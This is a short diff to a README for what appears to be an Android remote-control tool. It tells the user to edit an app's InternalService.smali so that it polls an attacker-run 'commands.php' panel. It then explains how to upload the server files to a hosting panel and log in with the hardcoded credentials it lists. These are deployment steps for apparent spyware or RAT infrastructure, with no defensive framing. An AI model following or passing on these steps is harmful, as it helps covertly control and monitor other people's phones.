@@ -53,3 +53,8 @@
 2. Now Open InternalService.smali 
 3. Now change this with your Panel Url ***const-string v0, "https://your-webpanel-url/commands.php"***
 ---
+### Building Server 
+1. Upload Files in server Folder to Your HostingPanel
+2. Now Open login.php 
+3. Enter Username ***Hande*** Password ***Ercel***
+4. Booom !!!! Thats it
